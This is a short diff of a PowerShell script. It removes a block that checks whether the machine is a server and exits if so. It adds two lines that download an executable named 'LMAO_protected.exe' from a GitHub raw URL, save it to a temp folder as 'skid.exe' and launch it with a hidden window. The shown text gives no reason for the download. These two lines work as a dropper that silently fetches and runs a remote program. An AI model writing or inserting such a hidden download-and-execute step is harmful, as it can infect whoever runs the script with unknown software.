@@ -1,10 +1,2 @@
-# Lấy thông tin hệ thống
-$computerSystem = Get-WmiObject -Class Win32_ComputerSystem
-
-# Kiểm tra loại máy
-if ($computerSystem.DomainRole -eq 1 -or $computerSystem.DomainRole -eq 2) {
-    Write-Host "This is a server. Exiting..."
-    exit
-} else {
-    Write-Host "This is not a server."
-}
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
+Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
